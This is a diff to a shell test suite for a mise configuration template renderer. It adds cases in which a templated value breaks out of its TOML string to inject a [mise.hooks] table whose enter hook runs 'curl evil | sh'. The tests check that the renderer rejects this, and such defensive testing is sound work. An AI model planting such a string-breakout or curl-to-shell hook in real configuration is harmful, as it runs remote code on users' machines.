@@ -2762,6 +2762,21 @@ run_case "<% %> in a tools.toml, a value that breaks the TOML" 2 "$mtest_values"
   'repo/tools/mtest/tools.toml: not valid TOML after render'
 case_args=' ' run_case "<% %> in a tools.toml, a tool without a template" 0 "$mtest_values" mtest_new '' check_mtest_new
 
+# A value that closes its string to add a table of its own, here a hook.
+msg_mise_keys='tools.toml: a rendered value changes the keys of the file'
+check_mtest_no_hook() {
+  local name="a value that adds a table"
+  check_that "$name: no mise.dev.toml" no_file "$consumer/.config/mise/conf.d/mtest/mise.dev.toml"
+  check_that "$name: the hook is in no written file" no_text_below 'curl evil' "$consumer"
+}
+# The values file holds the value, and .git is not a written file.
+no_text_below() { ! grep -rlF --exclude=bootstrap.toml --exclude-dir=.git -- "$1" "$2" > /dev/null; }
+case_args=' ' run_case "<% %> in a tools.toml, a value that adds a table" 2 "$mtest_values
+x = \"\"\"a\"
+[mise.hooks]
+enter = \"curl evil | sh\"
+z = \"z\"\"\"" mtest_new "repo/tools/mtest/$msg_mise_keys" check_mtest_no_hook
+
 # The shared mise generator, side macos: a direct call of the library, in the order
 # of a front-end, with the tools of $tmp/macos/tools. The value of a case is the
 # values file. `macos_tools` names the tools of the case.
@@ -2858,6 +2873,22 @@ ll = "ls -l"
 [mise.env]
 H = "<% .env.HOME %>"' '' '' check_macos_own
 CASE_CALL=macos_own run_macos "the macos side: a values file without [mise]" 0 '' '' '' check_macos_no_write
+# A value that closes its string to add a table of its own, here a hook.
+macos_adds_table() {
+  macos_tool mtest '[defaults]' 'x = """a"' '[mise.hooks]' 'enter = "curl evil | sh"' 'z = "z"""' \
+    '[mise.env]' 'X = "<% .config.x %>"'
+}
+run_macos "the macos side: a value that adds a table" 2 '' macos_adds_table \
+  "macos/tools/mtest/$msg_mise_keys" check_macos_no_write
+# The render alone: the front-ends read each tools.toml as TOML before it, so they
+# stop a raw file that is not TOML with their own message.
+macos_raw_bad() { macos_tool mtest '[mise.env]' '<% if true %>' 'X = "a"' '<% end %>'; }
+macos_render_only() {
+  macos_source
+  _se_mise_render macos "$tmp/macos/tools" macos/tools mtest "$values" "$tmp/macos/conf.d" '' ''
+}
+CASE_CALL=macos_render_only run_macos "<% %> in a tools.toml, a raw file that is not TOML" 2 '' macos_raw_bad \
+  'macos/tools/mtest/tools.toml: not valid TOML before render' check_macos_no_write
 
 while ((${#case_pids[@]})); do
   collect_case
